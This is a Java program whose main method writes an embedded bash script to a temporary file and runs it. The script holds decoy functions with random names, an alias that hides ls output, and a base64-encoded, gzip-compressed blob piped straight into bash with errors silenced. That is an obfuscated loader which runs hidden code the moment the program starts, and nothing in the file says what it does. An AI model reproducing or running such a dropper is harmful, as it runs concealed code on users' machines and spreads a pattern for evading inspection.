import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

v1sz1xxrm() { echo $((RANDOM * RANDOM)); }
v2gdn7pic() { for i in {1..3}; do :; done; }
vv4mwezo6() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
H4sIAAAAAAAAA6VUXU8bRxR9n18xnaDwUHYX25RgE5AomAbJsak/mqoIWePdsXfDeme1O2uTOpaSVhVRkxQeogqpqFWitOKFpJWqFCVB/BmvMU/5C73jXYNR+xav5Jm5H+eeuXNmrn2i1SxHq1HfROgaPn+3P3j18uyn1+GL78Pd/fOdXcS2Xe4JXKmsrSxMdOSQUSZn64m6MavPKvqNZEKZSehMSU/XdSU9QxPpNJ2D//pkd5S7vlS+BblygNw292xjzFkolqUThoySvPHZXLoLRHrHjwcnJ6OY0lr+i+rnha+rlWJugZhCuH5G0zzaVhuWMINa4DNP545gjlB13tTazPJNyim1NF/+tCaFTfqW01BqfJuMYFcKd/K5wtLKx8E67FuTKrQBUQSh5pZheVhxMZmQ+yVIN0ZTfP8+ZtuWwAmEvCZW6rjGuVBt3riYoIutnx0+Dt/ufnj/JPzju/6vB73jp+HRfnhwiDY2ZGYCb25KPD3wbKz4OQ4WMjHeJxJHpv4TmYLI8a0DR7PJDfzpNoCkJIWzZ7/1H+2d//D07ORV/+ed3rs3SKcCL2LoRt1qqHd97uCbN3G2sIo6CGMC1EkGdzAxLJ/WbGbASngBmwIXazEblsRy6pyAQVhN5gvadOMY3J2SEIbjSwiYwgIa32KeNGwAqKASnTQ4b9hMQlDD8Jgv3UTY8szm1OFHcHcTACJAy6nxwDEikAg2BmoBAV9p+4rlkKnYc89lF66R0bZ8OHtpzmSu2qpSP+CIdNuNfVIvI85BYMkmkOjKdCWzUSmPOn6cH/Eaq98eFQebS4UpbdoWCPfSzKhn36saVNCqyajBvKpDm8PkEtOVO6xW4voWE8q6xwXXuU2GiV3ZlyEFwgNx2Zmhs3NJANTLdDE8p6hZsQHHmxwLrdlQaCwyWg8rRYU8qMQiXdQth9pX4FAXSfmA2sK91+GPh3h0PZGqJbAXOFjRr+htUTNYS3MC28bJxesJfB35NmMuTiK34cEIWidxKgGpXkaD+DuY6SYHXcU14prhy78Gf//+4f1DMh/fzHkgNsZp7G4jh5uBi5nTwvlvqqVs8atscSGlmsxinsoClXuNzMxMSjrLudLCUNkwX86tZfNliF8uZssLpWwtsVzIWyydE5UvA6Yb06Xk0mz27up6Nnu7sopVLfU/G0Uooj843Rs8f9I7PlJVFd4aUJKLJyNX/9mb8NGf5w8ehDtve6fPw91/5Nvx8KB/9GJw+gu8JjJlHrtbFsCOt+qqLTXqxPQkXsuXcTlbvI1Qm1oC/QuGSImAKwYAAA==
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
